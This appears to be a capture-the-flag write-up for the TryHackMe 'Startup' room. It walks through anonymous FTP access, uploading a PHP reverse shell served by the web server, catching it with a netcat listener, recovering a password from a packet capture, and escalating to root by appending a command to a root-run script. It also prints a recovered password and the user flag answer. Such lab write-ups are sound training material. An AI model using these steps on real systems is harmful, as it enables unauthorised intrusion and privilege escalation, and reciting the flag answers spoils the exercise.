# [Startup](https://tryhackme.com/room/startup)

> Abuse traditional vulnerabilities via untraditional means.

## Scanning

first, we scan with nmap

```
nmap -A -T4 10.10.86.86
```

![image](https://user-images.githubusercontent.com/90561566/202391255-8dc00608-6faf-48b9-9685-4a30d1db64a7.png)

we can see 3 open ports are ftp (21), ssh (22) and http (80)

the most notable is ftp

![image](https://user-images.githubusercontent.com/90561566/202391799-6ad13366-75a7-4ae3-9cb2-f0ba4fc3ba61.png)

## FTP

```
ftp 10.10.86.86
Name (10.10.86.86:admin): anonymous
Password:
```

![image](https://user-images.githubusercontent.com/90561566/202393023-01179ee1-19c6-41de-8c15-8ecf2c31276c.png)

you maybe get an error like this

![image](https://user-images.githubusercontent.com/90561566/202394018-c2ac2dfa-adbc-4a7f-88e0-bc2badaa43b9.png)

the solution is `pass` mode on

![image](https://user-images.githubusercontent.com/90561566/202394119-34cb6715-5de9-45a8-b055-3b79cb627a68.png)

download all files to local and exit

```
get .test.log
get ftp
get important.jpg
get notice.txt
```

nothing here

![image](https://user-images.githubusercontent.com/90561566/202395916-1b4c32e9-2d9b-4ec1-a7d6-1f758dbb431c.png)

important.jpg

![image](https://user-images.githubusercontent.com/90561566/202396326-be353f36-eda8-4844-8101-532a4d1c2f16.png)

## HTTP

quick look at website

![image](https://user-images.githubusercontent.com/90561566/202397127-9841a316-e714-4bf0-81b8-a795da27cb3f.png)

nothing much here

![image](https://user-images.githubusercontent.com/90561566/202397328-5d64db2d-6ff3-48c6-a4cb-481a01c75e58.png)

## Enumeration

scan directories with gobuster

```
gobuster dir -u http://10.10.86.86/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://user-images.githubusercontent.com/90561566/202398516-22378b17-b66c-44be-8805-d112a4a1e4f3.png)

go to /files

![image](https://user-images.githubusercontent.com/90561566/202399145-c8b89bf2-d1a9-4f4a-bfb0-fd3a6410e5d6.png)

it's the interface of ftp

## Exploitation

prepare a web shell and change to your ip

```
cp /usr/share/webshells/php/php-reverse-shell.php reverse.php
vi reverse.php
```

let's go back to fpt and upload our shell

```
cd ftp
put reverse.php
```

![image](https://user-images.githubusercontent.com/90561566/202400688-dac15d49-fa39-445e-8be5-076656d4642c.png)

now we can see our shell here

![image](https://user-images.githubusercontent.com/90561566/202400761-176a6a53-185d-48b3-9fd8-a9359dd4cb08.png)

create listener and open file on browser

```
nc -vlnp 1234
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image](https://user-images.githubusercontent.com/90561566/202403261-dc874bcd-546b-431a-9da8-364ccfa5054a.png)

and the secret spicy soup recipe is `love`

![image](https://user-images.githubusercontent.com/90561566/202403567-a10149c0-fd42-41fa-923f-f4856d35d437.png)

let's see what in 2 suspicious folders here

![image](https://user-images.githubusercontent.com/90561566/202404109-b7fc3f73-c656-4fb9-adb5-9037b217f2b1.png)

hmm, a pcapng file, i will take it back to research

```
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
```

![image](https://user-images.githubusercontent.com/90561566/202405450-17aa3512-4d2e-4c2e-90f1-f0a7f801dd0e.png)

![image](https://user-images.githubusercontent.com/90561566/202652583-89a53d9d-01f1-440f-a574-edefe8a19a67.png)

## Cracking

open captured file with wireshark

```
wireshark -r ./Downloads/suspicious.pcapng 
```

![image](https://user-images.githubusercontent.com/90561566/202406829-5de606d7-538a-43a4-9617-61d754207602.png)

our concern should be http protocol, i see someone has request a web shell in the past

![image](https://user-images.githubusercontent.com/90561566/202407904-4b2186e3-567b-48fa-bf75-39a635033ebb.png)

let's take a look at tcp traffic 4444 dump it all out to plain text

![image](https://user-images.githubusercontent.com/90561566/202653302-a4cf17c3-b7a9-4d46-8cbc-3461e8e3e445.png)

after lookup, i can see here is the password for lennie

![image](https://user-images.githubusercontent.com/90561566/202412311-520555ec-70b3-4438-8657-bacbe2c1416d.png)

or you can use `strings` if you don't familiar with wireshark

```
strings suspicious.pcapng
```

![image](https://user-images.githubusercontent.com/90561566/202652851-4eeee1dc-69fb-4cba-92f1-594b6ae0376e.png)

```
su lennie
c4ntg3t3n0ughsp1c3
```

![image](https://user-images.githubusercontent.com/90561566/202412520-ce00699b-cca7-4cd4-9f3a-74a7996e6aa5.png)

flag here

![image](https://user-images.githubusercontent.com/90561566/202412792-71e3fea3-c7e4-49ed-91fb-37422a35e690.png)

| Flag | user.txt |
| --- | --- |
| Answer | THM{03ce3d619b80ccbfb3b7fc81e46c0e79} |

## Privilege Escalation

there is a scripts folder

![image](https://user-images.githubusercontent.com/90561566/202413237-9c3ac792-01fe-41c0-9663-10a8a9b6c774.png)

this file will run with root permission which is one key of privilege

![image](https://user-images.githubusercontent.com/90561566/202413562-ffb230c2-1725-48a0-8eb2-20b79d12204e.png)

it also run a file with lennie permission

![image](https://user-images.githubusercontent.com/90561566/202415242-39b20879-3392-446a-a212-7e1e929e9b92.png)

```
echo "cp /root/* /home/lennie/*;chmod 777 /home/lennie/*" >> /etc/print.sh

```


| Flag | root.txt |
| --- | --- |
| Answer | <flag> |
